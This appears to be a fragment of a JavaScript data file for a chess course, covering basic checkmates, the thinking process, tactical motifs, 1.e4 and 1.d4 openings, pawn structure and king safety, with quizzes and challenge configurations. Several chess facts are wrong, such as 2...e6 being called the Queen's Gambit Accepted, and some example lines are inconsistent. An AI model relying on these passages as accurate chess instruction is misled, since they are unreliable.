            { h: 'King and Rook vs King', body: 'Similar strategy but requires more care. Rook cuts off king along a rank or file. Your king must help because rook alone cannot force the enemy king to the edge. Push enemy king to edge using rook cuts and king moves. Once on the edge, position your king to support, then deliver checkmate with rook. More difficult than K+Q but same principles.' },
            { h: 'The Stalemate Trap', body: 'Common mistake: giving check when enemy king has no legal moves but isn\'t in check = stalemate = draw! Before checking, ensure enemy king has at least one legal move, OR verify it\'s checkmate. Give the king breathing room, then deliver the final blow.' },
          ],
          example: {
            lang: 'text',
            code: 'K+Q vs K Checkmate:\nPosition: White Ka6, Qa4; Black Kc8\n1. Qb5! (restricts king to 8th rank)\n1...Kd8 2. Qb7 (restricts king to 8th and forces to edge)\n2...Ke8 3. Kb6 (bring king up)\n3...Kf8 4. Qc7 (controls escape squares)\n4...Kg8 5. Qg7# (checkmate!)\n\nStalemate Warning:\nPosition: White Ka6, Qa5; Black Ka8 (to move)\nWrong: Qb6?? stalemate! (King has no moves and isn\'t in check)\nRight: Kb6 first, then Qa7# (checkmate!)\n\nK+R vs K:\nPosition: White Kb6, Rh6; Black Kd8\n1. Rc6! (cut off on c-file)\n1...Kd7 2. Kb7 (support with king)\n2...Kd8 3. Rc1 (give room, avoid stalemate)\n3...Ke7 4. Rc7+ forces back to 8th\nEventually: Rc8#'
          },
          ask: 'If the enemy king is on a8 and has no legal moves, is it checkmate?',
          keyPoints: [
            'K+Q vs K: Use queen to restrict, king to support',
            'Push enemy king to edge (rank 1, 8 or file a, h)',
            'K+R vs K: Rook cuts off, king must help push',
            'Watch for stalemate! Enemy king must have legal move OR be in checkmate',
            'Checkmate typically happens in corner or edge',
            'Your king must participate (pieces alone not enough for rook)',
            'Practice makes perfect — these are technique, not tricks'
          ],
          misconception: '"The queen alone can checkmate." No! The queen needs the king\'s help to deliver checkmate. Queen alone can only give perpetual check.'
        },
        practice: [
          {
            q: 'Can a queen alone (without the king\'s help) checkmate the enemy king?',
            choices: ['Yes, queen is powerful enough', 'No, need king to help', 'Only in the corner', 'Only with a rook'],
            answerIdx: 1,
            hint: 'Think about stalemate.',
            why: 'Queen alone cannot deliver checkmate. The attacking king must participate to avoid stalemate and restrict escape squares.'
          },
          {
            q: 'Where should you try to push the enemy king?',
            choices: ['To the center', 'To the edge or corner', 'Behind pawns', 'Anywhere'],
            answerIdx: 1,
            hint: 'Less escape squares on edge.',
            why: 'Push the enemy king to the edge (ranks 1/8 or files a/h) where it has fewer escape squares, making checkmate easier.'
          }
        ],
        quiz: [
          {
            q: 'If enemy king is on a8 with no legal moves and NOT in check, what is the result?',
            choices: ['Checkmate - you win', 'Stalemate - draw', 'Illegal position', 'King must move'],
            answerIdx: 1,
            why: 'Stalemate! If the side to move has no legal moves and is NOT in check, the game is a draw. Always check for this before your move.'
          },
          {
            q: 'In K+R vs K, why is the attacking king necessary?',
            choices: ['To look impressive', 'Rook alone cannot force king to edge', 'To block stalemate', 'It\'s not necessary'],
            answerIdx: 1,
            why: 'The rook cannot force the enemy king to the edge alone. The attacking king must help by cutting off escape squares and supporting the rook.'
          },
          {
            q: 'What is the maximum number of moves to checkmate with K+Q vs K?',
            choices: ['5 moves', '10 moves', '50 moves', 'No limit'],
            answerIdx: 1,
            why: 'With perfect play, K+Q vs K can deliver checkmate in at most 10 moves from any position. In practice, it often takes fewer.'
          }
        ],
        recall: [
            'Which pieces can deliver checkmate with just the king helping?',
            'What is the maximum number of moves for KQ vs K checkmate?',
            'Why can\'t a king and single bishop checkmate a lone king?',
            'What is the key principle for king and queen vs king checkmate?'
          ],

        challenge: {
          type: 'chess',
          kind: 'endgame',
          title: 'Master Basic Checkmates',
          timeMin: 25,
          brief: 'Deliver checkmate in three different endgame positions: K+Q vs K twice (different starting positions) and K+R vs K once. Must checkmate within the move limit.',
          scenarios: [
            {
              name: 'Queen Mate 1',
              fen: '8/8/8/8/8/1k6/8/K2Q4 w - - 0 1',
              objective: 'Checkmate in 10 moves or less',
              hint: 'Restrict the king, bring your king up, force to edge'
            },
            {
              name: 'Queen Mate 2',
              fen: '4k3/8/8/8/8/8/4Q3/4K3 w - - 0 1',
              objective: 'Checkmate in 10 moves or less',
              hint: 'Push king to side, avoid stalemate'
            },
            {
              name: 'Rook Mate',
              fen: '8/8/8/3k4/8/8/R7/K7 w - - 0 1',
              objective: 'Checkmate in 16 moves or less',
              hint: 'Cut off with rook, push with king, checkmate on edge'
            }
          ],
          requirements: ['deliver checkmate in all positions', 'avoid stalemate', 'complete within move limit'],
          passScore: 100,
          rewardNim: 4,
          xp: 150,
          evaluator: { type: 'chess', config: { mode: 'endgame', scenarios: 3, maxMoves: [10, 10, 16], requireCheckmate: true, penalizeStalemate: true } }
        }
      },
      {
        slug: 'chess-thinking',
        title: 'Chess Thinking Process',
        estMin: 30,
        difficulty: 1,
        lesson: {
          tldr: 'Strong players don\'t just move pieces randomly. They follow a systematic thinking process: check opponent threats first, identify candidate moves, calculate variations, and verify before moving.',
          sections: [
            { h: 'Check Opponent Threats First', body: 'Before thinking about your own plan, always ask: "What is my opponent threatening?" Check if any of your pieces are hanging (undefended and attacked). Look for checks, captures, and attacks. This prevents blunders. Only after understanding opponent threats should you consider your moves.' },
            { h: 'Identify Candidate Moves', body: 'Don\'t just play the first move you see! Generate 2-4 candidate moves (reasonable moves worth considering). Include forcing moves (checks, captures, threats). Include quiet moves (improving piece position, planning). Avoid obviously bad moves in your candidates.' },
            { h: 'Calculate Variations', body: 'For each candidate move, calculate the likely responses. Think at least 2-3 moves ahead for forcing moves. For quiet moves, visualize the position after your move. Consider: What can opponent do? Do I have an answer? Ask "then what?" repeatedly.' },
            { h: 'Verify and Move', body: 'Before touching a piece: Double-check you\'re not hanging pieces. Verify there\'s no better move. Check for opponent\'s forcing responses. Make sure you haven\'t missed a defensive resource. Then, and only then, make your move. Once you touch a piece, you must move it (touch-move rule)!' },
          ],
          example: {
            lang: 'text',
            code: 'Position: Your move\n\nSTEP 1: Check Threats\n"Is my opponent attacking anything?"\n- Yes, bishop attacking my knight on f6\n- Need to address this!\n\nSTEP 2: Candidate Moves\n1. Nxe4 (knight takes pawn, fork possible)\n2. Nh5 (knight moves to safety, attacks g3)\n3. Nd5 (knight to center square)\n4. Bd6 (block attack with bishop)\n\nSTEP 3: Calculate\nNxe4: They play Bxe4, I lose knight for pawn (bad)\nNh5: They play Bxd7 Qxd7, even trade (okay)\nNd5: They play Bxd7 Qxd7, but my knight is great on d5 (good!)\nBd6: Blocks attack but passive (okay)\n\nSTEP 4: Verify\nNd5 looks best: checks opponent can\'t win knight,\nno hanging pieces, improves position\n→ Play Nd5!\n\nCommon Mistakes to Avoid:\n❌ Playing first move you see\n❌ Not checking opponent threats\n❌ Forgetting to calculate responses\n❌ Moving without double-checking'
          },
          ask: 'What should you check BEFORE thinking about your own moves?',
          keyPoints: [
            'Step 1: Check opponent threats (checks, captures, attacks)',
            'Step 2: Generate 2-4 candidate moves',
            'Step 3: Calculate variations (2-3 moves ahead)',
            'Step 4: Verify before moving (no blunders, no better moves)',
            'Always ask "Then what?" when calculating',
            'Check for hanging pieces before EVERY move',
            'Take your time — blunders happen when rushing'
          ],
          misconception: '"Strong players calculate 20 moves ahead." Most calculate 2-5 moves deep but do it accurately and systematically.'
        },
        practice: [
          {
            q: 'What should you always check first on your turn?',
            choices: ['Your best attacking move', 'Opponent\'s threats', 'Your material count', 'Time on clock'],
            answerIdx: 1,
            hint: 'Defense before offense.',
            why: 'Always check opponent threats first! Prevents blunders. You can\'t execute your brilliant attack if you hang your queen.'
          },
          {
            q: 'How many candidate moves should you typically consider?',
            choices: ['1 move (the best one)', '2-4 moves', 'All legal moves', '10+ moves'],
            answerIdx: 1,
            hint: 'Not too few, not too many.',
            why: '2-4 candidate moves is practical. Too few means you might miss the best move. Too many wastes time on obviously bad moves.'
          }
        ],
        quiz: [
          {
            q: 'What is a "candidate move"?',
            choices: ['The best move in the position', 'A move worth considering seriously', 'A move recommended by computer', 'The first move you see'],
            answerIdx: 1,
            why: 'Candidate moves are moves worth seriously considering. You identify several, calculate them, then choose the best.'
          },
          {
            q: 'When should you touch a piece on the board?',
            choices: ['To think about moving it', 'Only when 100% decided to move it', 'To adjust its position', 'Whenever you want'],
            answerIdx: 1,
            why: 'Touch-move rule: if you touch a piece, you must move it (if legal). Only touch when you\'ve decided to move it!'
          },
          {
            q: 'What does "then what?" mean in chess thinking?',
            choices: ['Giving up', 'Calculating opponent\'s responses', 'Random moves', 'Asking for help'],
            answerIdx: 1,
            why: 'After each candidate move, ask "then what?" to calculate opponent\'s likely responses and continue the variation.'
          }
        ],
        recall: [
            'What are the main steps in the chess thinking process?',
            'Why should you look at checks first?',
            'What is a candidate move?',
            'How do you decide between two good moves?'
          ],

        challenge: {
          type: 'chess',
          kind: 'analysis',
          title: 'Think Like a Chess Player',
          timeMin: 30,
          brief: 'Given three complex positions, demonstrate the thinking process: identify opponent threats, list candidate moves, calculate variations, and choose the best move with explanation.',
          positions: [
            {
              fen: 'r1bqkb1r/pppp1ppp/2n2n2/4p3/2B1P3/2N2N2/PPPP1PPP/R1BQK2R b KQkq - 5 4',
              task: 'Identify Black\'s threats and find best move',
              questions: [
                'What is White threatening?',
                'List 3 candidate moves for Black',
                'Calculate best move 2 moves ahead',
                'Which move is best and why?'
              ]
            },
            {
              fen: '2kr3r/pppq1ppp/3p1n2/8/3PP3/2N2Q2/PPP2PPP/2KR3R w - - 0 12',
              task: 'Find White\'s winning combination',
              questions: [
                'Are any pieces hanging?',
                'What forcing moves exist?',
                'Calculate the main variation',
                'What is the winning move?'
              ]
            }
          ],
          requirements: ['identify threats correctly', 'list reasonable candidates', 'calculate accurately', 'explain reasoning'],
          passScore: 75,
          rewardNim: 4,
          xp: 150,
          evaluator: { type: 'chess', config: { mode: 'analysis', positions: 2, requireExplanation: true, checkThinking: true } }
        }
      },
      /* ══════ LEVEL 2: BEGINNER ══════ */
      {
        slug: 'tactical-motifs',
        title: 'Tactical Motifs: Discovery, Deflection, Decoy',
        estMin: 35,
        difficulty: 2,
        lesson: {
          tldr: 'Advanced tactical patterns build on fundamentals. Discovered attacks, deflection, and decoy tactics create powerful combinations that win material or deliver checkmate.',
          sections: [
            { h: 'Discovered Attack', body: 'When a piece moves, it reveals an attack from another piece behind it. Discovered check (reveals check) is especially powerful. The moving piece can capture or threaten while the revealed piece delivers the primary threat. Example: Knight on e4 moves, revealing bishop on c2 attacking queen on g6.' },
            { h: 'Deflection', body: 'Force an opponent\'s piece to leave a critical square or line. Often uses sacrifice to deflect. Example: Rxd7 forces Qxd7 (deflecting queen from defending back rank), then Rd8# is checkmate.' },
            { h: 'Decoy', body: 'Force an opponent\'s piece TO a square where it\'s vulnerable. Opposite of deflection. Example: Rook sacrifices on h7+ forcing Kxh7, now king is decoyed to dangerous square for Qh5+ and mate.' }
          ],
          example: {
            lang: 'text',
            code: 'Discovered Attack:\nWhite: Bf4 on c1, Ne5\nBlack: Qd8, loose pieces\nNe5 moves (say Nxf7) → discovers bishop attack on queen!\n\nDeflection:\nWhite: Rd1, Rd7; Black: Qd8, Kf8\n1. Rxd8+! Deflects queen: if Qxd8 2. Rd8# checkmate\n\nDecoy:\nWhite: Qh5, Rh7; Black: Kg8\n1. Rxh7+! Kxh7 (forced, king decoyed)\n2. Qh5+ Kg8 3. Qh8# checkmate'
          },
          ask: 'Can you create a discovered attack in your games?',
          keyPoints: [
            'Discovered attack: moving piece reveals attack from behind',
            'Discovered check is extremely powerful',
            'Deflection: force piece AWAY from key square',
            'Decoy: force piece TO vulnerable square',
            'Often involve sacrifices',
            'Look for pieces on same line (rank/file/diagonal)'
          ],
          misconception: '"Discovered attacks only work with bishops." Any long-range piece (Q, R, B) can deliver discovered attacks.'
        },
        practice: [
          {
            q: 'What makes discovered check especially powerful?',
            choices: ['It wins material', 'Opponent must respond to check, moving piece attacks freely', 'It always leads to mate', 'Nothing special'],
            answerIdx: 1,
            hint: 'King must escape check.',
            why: 'Discovered check forces opponent to respond to the check, so the moving piece can capture or create threats without fear of being captured.'
          },
          {
            q: 'Deflection vs Decoy: what\'s the difference?',
            choices: ['No difference', 'Deflection forces away, decoy lures in', 'Decoy is for pawns only', 'Deflection is illegal'],
            answerIdx: 1,
            hint: 'Direction of force.',
            why: 'Deflection forces a piece AWAY from where it wants to be. Decoy lures a piece TO where you want it.'
          }
        ],
        quiz: [
          {
            q: 'Can a discovered attack occur with a knight and rook?',
            choices: ['No, only bishops', 'Yes, if knight moves revealing rook attack', 'Only on the kingside', 'Never'],
            answerIdx: 1,
            why: 'Yes! Any piece can move to discover an attack from a long-range piece (Q, R, B) behind it.'
          },
          {
            q: 'Why are sacrifice tactics often called "forcing moves"?',
            choices: ['They force opponent to calculate', 'They force specific responses (like recapture)', 'They force a draw', 'They aren\'t forcing'],
            answerIdx: 1,
            why: 'Sacrifices often force the opponent to recapture or respond in specific ways, limiting their options and giving you control.'
          },
          {
            q: 'What should you look for to spot discovered attack opportunities?',
            choices: ['Opposite colored bishops', 'Two of your pieces on same line with enemy piece beyond', 'Only in endgames', 'Center pawns'],
            answerIdx: 1,
            why: 'Look for your pieces aligned on the same rank, file, or diagonal with an enemy piece or key square beyond them.'
          }
        ],
        recall: [
            'What is a discovered attack?',
            'Explain deflection in chess tactics',
            'What is a decoy sacrifice?',
            'Describe the "removing the defender" tactic'
          ],

        challenge: {
          type: 'chess',
          kind: 'puzzle',
          title: 'Master Advanced Tactics',
          timeMin: 30,
          brief: 'Solve 6 puzzles featuring discovered attacks, deflections, and decoys. Find the winning combination in each position.',
          puzzles: 6,
          themes: ['discovered-attack', 'discovered-attack', 'deflection', 'deflection', 'decoy', 'decoy'],
          requirements: ['identify tactic type', 'calculate full combination', 'find all forcing moves'],
          passScore: 80,
          rewardNim: 4,
          xp: 160,
          evaluator: { type: 'chess', config: { mode: 'puzzle', puzzleCount: 6, themes: ['discovery', 'deflection', 'decoy'], exactMoves: true } }
        }
      },
      {
        slug: 'opening-systems-e4',
        title: 'Opening Systems: 1.e4 (Open Games)',
        estMin: 35,
        difficulty: 2,
        lesson: {
          tldr: '1.e4 is the most popular first move, leading to open, tactical games. Learn the key systems: Italian Game, Spanish/Ruy Lopez, and Sicilian Defense.',
          sections: [
            { h: 'Italian Game', body: 'After 1.e4 e5 2.Nf3 Nc6 3.Bc4, White develops quickly and aims at f7 (weak square). Black responds 3...Bc5 or 3...Nf6. Main ideas: develop, castle, control center. Leads to tactical middlegames. Good for beginners: clear plans, piece activity.' },
            { h: 'Ruy Lopez (Spanish)', body: '1.e4 e5 2.Nf3 Nc6 3.Bb5. Most principled opening, pressures e5 pawn. Main line: 3...a6 4.Ba4 Nf6 5.O-O. Complex and strategic. White gets slight edge with proper play. Deep theory but solid plans.' },
            { h: 'Sicilian Defense', body: 'Black\'s 1...c5 is most ambitious response to 1.e4. Asymmetric pawn structure creates imbalanced positions. Main lines: 2.Nf3 followed by 3.d4 cxd4 4.Nxd4 (Open Sicilian). Black gets counterplay on queenside, White attacks kingside. Sharp and double-edged.' }
          ],
          example: {
            lang: 'text',
            code: 'Italian Game:\n1. e4 e5 2. Nf3 Nc6 3. Bc4 Bc5\n4. c3 (prepares d4) Nf6 5. d4 exd4\n6. cxd4 Bb4+ 7. Bd2 (or Nc3)\n\nRuy Lopez:\n1. e4 e5 2. Nf3 Nc6 3. Bb5 a6\n4. Ba4 Nf6 5. O-O Be7 6. Re1 b5\n7. Bb3 O-O (Closed Ruy Lopez)\n\nSicilian Defense:\n1. e4 c5 2. Nf3 d6 3. d4 cxd4\n4. Nxd4 Nf6 5. Nc3 a6 (Najdorf)\nOr: 5...Nc6 (Classical)\nOr: 5...g6 (Dragon)'
          },
          ask: 'Which opening suits your style: tactical Italian or strategic Ruy Lopez?',
          keyPoints: [
            '1.e4: king\'s pawn opening, open games',
            'Italian: Quick development, tactical',
            'Ruy Lopez: Strategic pressure, slight edge',
            'Sicilian: Black\'s most fighting defense',
            'Open games = tactical, sharp play',
            'Learn one system deeply before many systems shallowly'
          ],
          misconception: '"Openings must be memorized to 20 moves." Understand the IDEAS — memorization comes naturally with practice.'
        },
        practice: [
          {
            q: 'After 1.e4 e5 2.Nf3 Nc6 3.Bc4, what is White mainly targeting?',
            choices: ['The queenside', 'The f7 square', 'The d4 square', 'The king'],
            answerIdx: 1,
            hint: 'Weak square in Black\'s position.',
            why: 'f7 is only defended by the king initially. Bc4 and Nf3 both attack f7, creating immediate pressure.'
          },
          {
            q: 'What characterizes the Sicilian Defense?',
            choices: ['Symmetric pawn structure', 'Asymmetric structure with counterplay', 'Quick trades', 'Closed position'],
            answerIdx: 1,
            hint: 'Black plays c5, not e5.',
            why: 'Sicilian creates asymmetric pawn structure (White has e4, Black has c5). This leads to imbalanced, fighting chess with both sides having different plans.'
          }
        ],
        quiz: [
          {
            q: 'In the Ruy Lopez, why does White play 3.Bb5?',
            choices: ['To trade bishop for knight', 'To pressure the knight defending e5', 'To prepare queenside castling', 'Random development'],
            answerIdx: 1,
            why: '3.Bb5 pins the knight on c6, increasing pressure on Black\'s e5 pawn. The bishop may later take the knight if needed.'
          },
          {
            q: 'Which is considered Black\'s most ambitious reply to 1.e4?',
            choices: ['1...e5', '1...c5 (Sicilian)', '1...e6', '1...Nf6'],
            answerIdx: 1,
            why: '1...c5 Sicilian Defense is considered most ambitious — Black fights for advantage rather than equality, leading to imbalanced positions.'
          },
          {
            q: 'What is the main idea behind 1.e4?',
            choices: ['Develop queen quickly', 'Control center and open lines for pieces', 'Prepare castling', 'Attack immediately'],
            answerIdx: 1,
            why: '1.e4 controls d5 and f5, opens lines for the bishop and queen, and stakes claim to the center — all key opening principles.'
          }
        ],
        recall: [
            'Name two common black responses to 1.e4',
            'What is the main idea behind the Italian Game?',
            'Why is 1.e4 considered more aggressive than 1.d4?',
            'What is the Sicilian Defense main concept?'
          ],

        challenge: {
          type: 'chess',
          kind: 'opening',
          title: 'Master 1.e4 Systems',
          timeMin: 30,
          brief: 'Play the first 8 moves of the Italian Game, Ruy Lopez, and respond correctly to the Sicilian Defense as White.',
          scenarios: [
            { opening: 'Italian Game', moves: 8, correctIdeas: true },
            { opening: 'Ruy Lopez', moves: 8, correctIdeas: true },
            { opening: 'Sicilian Defense', moves: 8, playAsWhite: true }
          ],
          requirements: ['follow opening principles', 'develop naturally', 'avoid early mistakes', 'demonstrate understanding'],
          passScore: 80,
          rewardNim: 4,
          xp: 160,
          evaluator: { type: 'chess', config: { mode: 'opening', systems: ['italian', 'ruy-lopez', 'sicilian'], checkUnderstanding: true } }
        }
      },
      {
        slug: 'opening-systems-d4',
        title: 'Opening Systems: 1.d4 (Closed Games)',
        estMin: 35,
        difficulty: 2,
        lesson: {
          tldr: '1.d4 leads to more strategic, positional games. Learn the Queen\'s Gambit, London System, and key defenses like the King\'s Indian and Nimzo-Indian.',
          sections: [
            { h: 'Queen\'s Gambit', body: '1.d4 d5 2.c4 is the Queen\'s Gambit (not really a gambit!). White offers c-pawn to gain central control. Main lines: 2...e6 (Accepted) or 2...c6 (Declined). Strategic play, less tactical than e4. Fighting for central squares d4/d5.' },
            { h: 'London System', body: '1.d4 Nf6 2.Bf4 (or 2.Nf3 then 3.Bf4). Solid setup, less theory-heavy. White develops: Nf3, e3, Bd3, Nbd2, c3. Flexible against various Black setups. Good for players wanting to avoid memorization. Positional understanding matters more than tactics.' },
            { h: 'Indian Defenses', body: 'Black fianchettos bishop (g7 or b7) and fights for center with pieces, not pawns. King\'s Indian: ...Nf6, ...g6, ...Bg7, ...O-O, ...d6. Nimzo-Indian: 1.d4 Nf6 2.c4 e6 3.Nc3 Bb4 (pins knight). Hypermodern strategy: control center from afar.' }
          ],
          example: {
            lang: 'text',
            code: 'Queen\'s Gambit Declined:\n1. d4 d5 2. c4 e6 3. Nc3 Nf6\n4. Bg5 Be7 5. e3 O-O 6. Nf3 h6\n7. Bh4 (Orthodox line)\n\nLondon System:\n1. d4 Nf6 2. Nf3 d5 3. Bf4 e6\n4. e3 Bd6 5. Bd3 O-O 6. Nbd2 c5\n7. c3 (solid setup complete)\n\nKing\'s Indian Defense:\n1. d4 Nf6 2. c4 g6 3. Nc3 Bg7\n4. e4 d6 5. Nf3 O-O 6. Be2 e5\n(Fighting for center with pieces)'
          },
          ask: 'Do you prefer 1.e4 sharp tactics or 1.d4 strategic play?',
          keyPoints: [
            '1.d4: queen\'s pawn, more strategic than e4',
            'Queen\'s Gambit: fight for center with pawns',
            'London System: solid, flexible, less theory',
            'Indian Defenses: control center with pieces',
            'd4 games typically more closed, strategic',
            'Positional understanding crucial in d4 openings'
          ],
          misconception: '"1.d4 is boring and drawish." Modern d4 games are rich and complex, just less immediately tactical than e4.'
        },
        practice: [
          {
            q: 'Is the Queen\'s Gambit a real gambit?',
            choices: ['Yes, White sacrifices a pawn', 'No, White easily regains the c-pawn', 'Only if Black accepts', 'It\'s unclear'],
            answerIdx: 1,
            hint: 'Can White win back the pawn?',
            why: 'Not a true gambit! After 2...dxc4, White can easily regain the pawn with moves like e3 and Bxc4. No lasting sacrifice.'
          },
          {
            q: 'What is the main idea of the London System?',
            choices: ['Aggressive attack', 'Solid, flexible development', 'Sacrifice queen', 'Gambit pawns'],
            answerIdx: 1,
            hint: 'Consistent setup.',
            why: 'London System prioritizes solid, consistent development (Bf4, Nf3, e3, Bd3, Nbd2, c3) that works against most Black setups.'
          }
        ],
        quiz: [
          {
            q: 'In the King\'s Indian Defense, where does Black typically place the dark-squared bishop?',
            choices: ['e7', 'g7 (fianchetto)', 'd6', 'b4'],
            answerIdx: 1,
            why: 'King\'s Indian features the fianchetto setup with ...g6 and ...Bg7, controlling the long diagonal.'
          },
          {
            q: 'What makes Indian Defenses "hypermodern"?',
            choices: ['They use computers', 'Control center with pieces, not pawns', 'Play only with knights', 'Castle queenside'],
            answerIdx: 1,
            why: 'Hypermodern strategy: instead of occupying center with pawns early, control it from distance with pieces (bishops, knights).'
          },
          {
            q: 'Why might someone choose the London System?',
            choices: ['Most forcing moves', 'Avoid opening theory memorization', 'Guaranteed wins', 'Only for beginners'],
            answerIdx: 1,
            why: 'London System requires less memorization since White plays similar setup regardless of Black\'s choices. Focus on understanding over theory.'
          }
        ],
        recall: [
            'Name two main 1.d4 opening systems',
            'What is the key idea of the London System?',
            'How does 1.d4 strategy differ from 1.e4?',
            'Why is the Queen\'s Gambit not a true gambit?'
          ],

        challenge: {
          type: 'chess',
          kind: 'opening',
          title: 'Master 1.d4 Systems',
          timeMin: 30,
          brief: 'Demonstrate understanding of Queen\'s Gambit, London System, and one Indian Defense. Play the first 8 moves accurately.',
          scenarios: [
            { opening: 'Queen\'s Gambit', side: 'white', moves: 8 },
            { opening: 'London System', side: 'white', moves: 8 },
            { opening: 'King\'s Indian', side: 'black', moves: 8 }
          ],
          requirements: ['accurate move order', 'demonstrate key ideas', 'explain pawn structures', 'show positional understanding'],
          passScore: 80,
          rewardNim: 4,
          xp: 160,
          evaluator: { type: 'chess', config: { mode: 'opening', systems: ['queens-gambit', 'london', 'kings-indian'], verifyIdeas: true } }
        }
      },
      {
        slug: 'pawn-structure',
        title: 'Pawn Structure & Weaknesses',
        estMin: 30,
        difficulty: 2,
        lesson: {
          tldr: 'Pawns are the soul of chess. Their structure determines long-term strategy. Understanding pawn weaknesses (isolated, doubled, backward, passed) is key to positional play.',
          sections: [
            { h: 'Isolated Pawn', body: 'A pawn with no friendly pawns on adjacent files. Cannot be defended by pawns. Can be weak (target for attack) but also provides space and piece activity. Isolated d-pawn (IQP) is common: dynamic but potentially weak in endgame.' },
            { h: 'Doubled & Backward Pawns', body: 'Doubled: Two pawns on same file (after capture). Often weak, cannot defend each other. Backward: Pawn that cannot advance safely, behind neighboring pawns. Both are static weaknesses that can be exploited in long term.' },
            { h: 'Passed Pawn', body: 'Pawn with no enemy pawns to stop its advance (same file or adjacent files). Strong asset, especially in endgame. "Passed pawns must be pushed!" Protected passed pawn (defended by own pawn) is especially powerful. Outside passed pawn wins endgames.' }
          ],
          example: {
            lang: 'text',
            code: 'Isolated d-pawn:\nWhite: d4 pawn, no c or e pawns\nPros: space, piece activity, tactical chances\nCons: target in endgame, can\'t be defended by pawns\n\nDoubled pawns:\nWhite: f2 and f3 (both on f-file)\nWeakness: can\'t defend each other, holes created\n\nPassed pawn:\nWhite: e5 pawn\nBlack: no d, e, or f pawns able to stop it\nPower: Advances toward promotion\nIn endgame: often decides the result'
          },
          ask: 'Do you notice pawn weaknesses in your games?',
          keyPoints: [
            'Isolated pawn: no friendly pawns on adjacent files',
            'Doubled pawns: two on same file (usually weak)',
            'Backward pawn: behind neighbors, cannot advance',
            'Passed pawn: no enemy pawns blocking (strong!)',
            'Pawn structure is semi-permanent',
            'Different structures suggest different plans',
            'Trade pieces when you have weaknesses, keep pieces when opponent has them'
          ],
          misconception: '"Isolated pawns are always bad." In middlegame with pieces, isolated pawn can provide dynamic play and activity!'
        },
        practice: [
          {
            q: 'Why is a passed pawn powerful in the endgame?',
            choices: ['It attacks more squares', 'Nothing can stop it from promoting', 'It defends the king', 'It controls the center'],
            answerIdx: 1,
            hint: 'Think about promotion.',
            why: 'A passed pawn has no enemy pawns to block it, so in the endgame it races toward promotion, often forcing opponent\'s pieces to stop it.'
          },
          {
            q: 'When should you try to trade pieces if you have an isolated pawn?',
            choices: ['Immediately', 'In the endgame when it\'s weaker', 'Never trade', 'Only trade knights'],
            answerIdx: 1,
            hint: 'Isolated pawns are weaker with fewer pieces.',
            why: 'Isolated pawns become weaker targets in simplified endgames. Keep pieces on to maintain dynamic compensation.'
          }
        ],
        quiz: [
          {
            q: 'What defines an isolated pawn?',
            choices: ['Far from the king', 'No friendly pawns on adjacent files', 'Already promoted', 'Doubled on a file'],
            answerIdx: 1,
            why: 'Isolated = no friendly pawns on the files next to it. Cannot be defended by other pawns.'
          },
          {
            q: 'Which pawn structure is generally strongest in the endgame?',
            choices: ['Isolated pawn', 'Doubled pawns', 'Passed pawn', 'Backward pawn'],
            answerIdx: 2,
            why: 'Passed pawns are powerful in endgames because they threaten promotion and tie down opponent\'s pieces.'
          },
          {
            q: 'What is a "protected passed pawn"?',
            choices: ['Passed pawn defended by king', 'Passed pawn defended by another pawn', 'Passed pawn on 7th rank', 'Passed pawn in center'],
            answerIdx: 1,
            why: 'Protected passed pawn is defended by another pawn, making it extremely strong since it cannot be attacked by pieces easily.'
          }
        ],
        recall: [
            'What makes a pawn "passed"?',
            'Why are doubled pawns considered weak?',
            'What is a pawn chain and how do you attack it?',
            'Explain what an isolated pawn is'
          ],

        challenge: {
          type: 'chess',
          kind: 'analysis',
          title: 'Evaluate Pawn Structures',
          timeMin: 25,
          brief: 'Analyze 4 positions: identify pawn weaknesses, evaluate structure, and propose plans based on pawn structure.',
          positions: [
            { theme: 'isolated-pawn', evaluate: true, suggestPlan: true },
            { theme: 'doubled-pawns', evaluate: true, suggestPlan: true },
            { theme: 'passed-pawn', evaluate: true, suggestPlan: true },
            { theme: 'backward-pawn', evaluate: true, suggestPlan: true }
          ],
          requirements: ['identify all weaknesses', 'explain strategic implications', 'propose concrete plans'],
          passScore: 75,
          rewardNim: 3,
          xp: 140,
          evaluator: { type: 'chess', config: { mode: 'analysis', themes: ['pawn-structure'], requireExplanation: true } }
        }
      },
      {
        slug: 'king-safety',
        title: 'King Safety & Attacking the King',
        estMin: 30,
        difficulty: 2,
        lesson: {
          tldr: 'King safety is paramount. Understand how to keep your king safe while recognizing when to launch an attack against the opponent\'s king.',
          sections: [
            { h: 'Castled Position Safety', body: 'After castling, pawn shield (f, g, h pawns for kingside) is critical. Don\'t move these pawns without good reason! Open files toward your king are dangerous. Keep pieces defending (especially knight on f3/f6). Watch for opponent opening lines (files, diagonals) toward your king.' },
            { h: 'Attacking Patterns', body: 'Greek Gift: Bxh7+ sacrifice (or Bxh2+). Works when king takes and is exposed. Rook lifts: Rook to 3rd rank then swings to kingside (e.g., Ra3-Rh3). Pawn storms: Advance pawns toward enemy king (g4-g5-g6 or h4-h5-h6). Piece sacrifices: Often effective to expose king (Nxf7, Bxh7+, Rxh7+).' },
            { h: 'When to Attack', body: 'Attack when: You have more attacking pieces than defender has defenders. Opponent king has weak pawn shelter. You can open files/diagonals toward king. Your king is safe. Don\'t attack recklessly — one extra defender can stop the attack!' }
          ],
          example: {
            lang: 'text',
            code: 'Greek Gift Sacrifice:\nWhite: Bc4, Qd3, Ng5; Black: Kg8, pawns f7,g7,h7\n1. Bxh7+! Kxh7 2. Ng5+ Kg8 (or Kg6)\n3. Qh3! threatens Qh8#, Black must give up material\n\nRook Lift:\nWhite: Rf1, Qd2\n1. Rf3! (lift rook to 3rd rank)\n2. Rh3 (swing to attack)\nThreats along h-file\n\nPawn Storm:\nOpponent castled kingside, you queenside\nAdvance g4-g5-g6 or h4-h5-h6 pawns\nOpens lines, weakens king shelter'
          },
          ask: 'Is your king safer after castling kingside or queenside?',
          keyPoints: [
            'Pawn shield is critical — don\'t weaken it',
            'Castle early (usually kingside)',
            'Keep defenders near your king',
            'Open files toward king are dangerous',
            'Attack when you have more attackers than defenders',
            'Greek Gift (Bxh7+) is common sacrifice pattern',
            'Rook lifts and pawn storms are attacking techniques'
          ],
          misconception: '"Attacking always wins." No! Premature attacks fail. Need superiority of force and safe king first.'
        },
        practice: [
          {
            q: 'Why is the pawn shield important after castling?',
            choices: ['Looks nice', 'Protects king from direct attacks', 'Helps promote pawns', 'Required by rules'],
            answerIdx: 1,
            hint: 'Think about exposure.',
            why: 'The pawn shield (f, g, h pawns) protects the castled king from piece attacks. Weakening it exposes the king to danger.'
          },
          {
            q: 'When should you launch an attack on the enemy king?',
            choices: ['Immediately every game', 'When you have attacking advantage and your king is safe', 'Only in the endgame', 'Never attack'],
